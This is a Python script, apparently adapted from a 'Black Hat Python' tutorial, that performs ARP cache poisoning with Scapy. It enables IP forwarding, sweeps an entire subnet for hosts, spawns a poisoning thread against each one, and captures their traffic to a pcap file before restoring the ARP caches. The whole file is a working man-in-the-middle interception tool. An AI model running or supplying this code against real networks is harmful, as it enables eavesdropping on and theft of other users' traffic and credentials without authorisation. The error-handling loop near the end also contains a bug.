"""
    posion ARP cache of a network for a given target host and gateway
    source: https://ismailakkila.medium.com/
    black-hat-python-arp-cache-poisoning-with-scapy-7cb1d8b9d242
"""
import os
import signal
import sys
import threading
import time
from typing import List, Tuple

from scapy.config import conf
from scapy.layers.l2 import ARP, Ether
from scapy.packet import Packet
from scapy.sendrecv import send, sniff, srp
from scapy.utils import wrpcap

from utils.util import BROADCAST_MAC, get_mac

# ARP poison parameters
GATEWAY_IP = "10.2.32.1"
# TARGET_IP = "10.2.48.191"
NETWORK = "10.2.32.0/19"
PACKET_COUNT = 1000
conf.iface = "en0"
conf.verb = 0


def extract_hosts(network: str) -> Tuple[List[str], List[str]]:
    """
        Return a list of host ip and corresponding mac addresses
    """
    packet = Ether(dst=BROADCAST_MAC)/ARP(pdst=network)
    result = srp(packet, timeout=3, verbose=0)[0]

    ips = []
    macs = []
    for _, received in result:
        print(f"[*] Found {received.psrc} at {received.hwsrc}")
        ips.append(received.psrc)
        macs.append(received.hwsrc)
    return (ips, macs)


def attack(packet: Packet) -> None:
    """
        attack the packet
    """
    # print(packet.show())


def restore_network(gip: str, gmac: str, tip: str, tmac: str) -> None:
    """
        Restore the network by reversing the ARP poison attack

        Broadcast ARP reply with correct MAC and IP address information
    """
    send(
        ARP(
            op=2,  # reply to all as target
            hwdst=BROADCAST_MAC,  # broadcast to every host
            pdst=gip,  # gateway IP
            hwsrc=tmac,  # MAC of target
            psrc=tip  # IP target
        ),
        count=5
    )
    send(
        ARP(
            op=2,  # reply to target as gateway
            hwdst=BROADCAST_MAC,  # broadcast to every host
            pdst=tip,  # target IP
            hwsrc=gmac,  # gateway MAC
            psrc=gip  # gateway IP
        ),
        count=5
    )

    print("[*] Disabling IP forwarding")
    os.system("sysctl -w net.inet.ip.forwarding=0")  # disable IP forwarding
    os.kill(os.getpid(), signal.SIGTERM)  # kill process


def arp_poison(gip: str, gmac: str, tip: str, tmac: str):
    """
        Send false ARP replies to put this machine in the middle to intercept packets
    """
    print("[*] Started ARP poison attack [CTRL-C to stop]")
    try:
        while True:
            send(ARP(
                op=2,  # reply to gateway as target
                pdst=gip,  # gateway IP
                hwdst=gmac,  # gateway MAC
                psrc=tip  # target MAC
                # tell gateway that MAC of target IP is MAC of this machine
            ))
            send(ARP(
                op=2,  # reply to target as gateway
                pdst=tip,  # target IP
                hwdst=tmac,  # target MAC
                psrc=gip  # gateway IP
                # tell target that MAC of gateway IP is MAC of this machine
            ))

            time.sleep(2)  # wait before sending packets again
    except KeyboardInterrupt:
        print("[*] Stopped ARP poison attack. Restoring network")
        restore_network(gip, gmac, tip, tmac)


print("[*] Starting script: poison.py")
print("[*] Enabling IP forwarding")
os.system("sysctl -w net.inet.ip.forwarding=1")  # Enable IP forwarding
print(f"[*] Gateway IP address: {GATEWAY_IP}")
# print(f"[*] Target IP address: {TARGET_IP}")

gateway_mac = get_mac(GATEWAY_IP)
if gateway_mac is None:
    print("[!] Unable to get gateway MAC address. Exiting..")
    sys.exit(0)
else:
    print(f"[*] Gateway MAC address: {gateway_mac}")

# target_mac = get_mac(TARGET_IP)
# if target_mac is None:
#     print("[!] Unable to get target MAC address. Exiting...")
#     sys.exit(0)
# else:
#     print(f"[*] Target MAC address: {target_mac}")

target_ips, target_macs = extract_hosts(NETWORK)
SNIFF_FILTER = "host " + " or host ".join(target_ips)

for i, ip in enumerate(target_ips):
    # start ARP poison thread for each host and
    poison_thread = threading.Thread(
        target=arp_poison,
        args=(GATEWAY_IP, gateway_mac, ip, target_macs[i])
    )
    poison_thread.start()

# sniff network traffic, only get packets intended for target host
try:
    print(
        f"[*] Starting network capture. Packet Count: {PACKET_COUNT}. Filter: {SNIFF_FILTER}")
    packets = sniff(
        filter=SNIFF_FILTER,
        iface=conf.iface,
        count=PACKET_COUNT,
        prn=attack
    )
    wrpcap("capture.pcap", packets)  # write to file
    print("[*] Stopping network capture..Restoring network")

    for i, ip in enumerate(target_ips):
        # restore ARP cache
        restore_network(GATEWAY_IP, gateway_mac, target_ips[i], target_macs[i])

except KeyboardInterrupt:
    print("[*] Stopping network capture..Restoring network")
    for i, ip in (target_ips):
        # restore ARP cache
        restore_network(GATEWAY_IP, gateway_mac, target_ips[i], target_macs[i])
    sys.exit(0)
